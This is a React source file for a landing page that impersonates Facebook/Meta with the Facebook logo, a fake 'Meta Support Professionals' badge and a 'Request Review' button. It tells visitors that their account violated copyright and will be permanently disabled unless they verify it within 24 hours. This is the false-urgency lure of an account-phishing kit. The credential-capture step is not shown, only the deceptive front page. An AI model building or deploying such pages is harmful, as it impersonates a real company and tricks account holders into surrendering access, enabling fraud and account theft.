import React from 'react';

function LandingPage({ onGetStarted }) {
  return (
    <div style={{ background: '#fff' }}>
      <style jsx>{`
        body {
          background-color: #f0f2f5;
          font-family: Helvetica;
          -webkit-font-smoothing: antialiased;
        }
        
        .header-section {
          background-color: #f9f9f9;
          height: 55px;
          background: #fff;
          border-bottom: .5px solid rgba(0,0,0,.15);
        }
        
        .header-container {
          width: 90%;
          margin: auto;
          overflow: hidden;
        }
        
        .w-25 {
          float: left;
        }
        
        .k0f0a27 {
          color: #0866FF;
        }
        
        ._a4pc {
          height: 54px;
        }
        
        .q61vvz9 {
          fill: white;
        }
        
        .body {
          display: flex;
          flex-direction: column;
          align-items: center;
        }
        
        .form-wrapper {
          border: .5px solid rgba(0, 0, 0, .15);
          border-radius: 8px;
          display: flex;
          flex-direction: column;
          max-width: 500px;
          padding: 10px 10px;
          width: 98%;
          margin: auto;
          margin-top: 5vh;
          background-color: #fff;
        }
        
        .form-wrapper h3 {
          color: #000000e0;
          font-size: 19px;
          font-weight: bold;
          margin-bottom: 3px;
        }
        
        .blok1 {
          font-size: 14px;
          color: #000;
          margin-bottom: 5px;
          line-height: 1.2rem;
        }
        
        .form-check {
          box-shadow: 0 0 1px #0000001a, 0 0 4px #0000001a;
          padding: 15px;
          border-radius: 8px;
          display: flex;
          align-items: center;
          margin-bottom: 15px;
        }
        
        .btn {
          color: #fff;
          padding: 10px 20px;
          font-weight: 700;
          font-family: Helvetica, Arial, sans-serif;
          background: #0d6efd;
          border: none;
          border-radius: 6px;
          cursor: pointer;
          width: 100%;
        }
        
        .btn:hover {
          opacity: .8;
        }
        
        .Tex5 {
          font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
          font-size: 17px;
          line-height: 1.2rem;
          font-weight: bold;
          color: #000000e0;
          margin-left: 8px;
        }
      `}</style>
      
      <div className="welcome">
        <header className="header-section">
          <div className="header-container">
            <div className="w-25">
              <div className="logo-area">
                <svg viewBox="0 0 36 36" className="k0f0a27 _a4pc" fill="currentColor" height={40} width={40}>
                  <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z" />
                  <path className="q61vvz9" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z" />
                </svg>
              </div>
            </div>
          </div>
        </header>
        
        <div className="body mb-5">
          <div className="form-wrapper">
            <h3>Account will be deactivated</h3>
            <div className="blok1">
              Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.
            </div>
            <div className="blok1">
              If you think we've accidentally suspended your account, you have 24 hours to verify your account. If you miss this security notification, your account will be permanently disabled.
            </div>
            <div className="select-issue">
              <div className="form-check">
                <table border={0} cellSpacing={0} cellPadding={0} style={{ borderCollapse: 'collapse' }}>
                  <tbody>
                    <tr>
                      <td valign="top">
                        <img 
                          width={64}
                          src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAACXBIWXMAAAsTAAALEwEAmpwYAAAKT2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AUkSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXXPues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgABeNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAtAGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dXLh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzABhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/phCJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhMWE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQAkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+IoUspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdpr+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZD5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61MbU2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllirSKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79up+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6VhlWGX4SU"
                          alt="Meta Support"
                          style={{ borderRadius: '8px' }}
                        />
                      </td>
                      <td style={{ paddingLeft: '15px' }}>
                        <div className="Tex5">Meta Support Professionals</div>
                        <div style={{ fontSize: '14px', color: '#737373', marginTop: '5px' }}>
                          We will help you solve your account problems
                        </div>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <button className="btn" onClick={onGetStarted}>
                Request Review
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default LandingPage;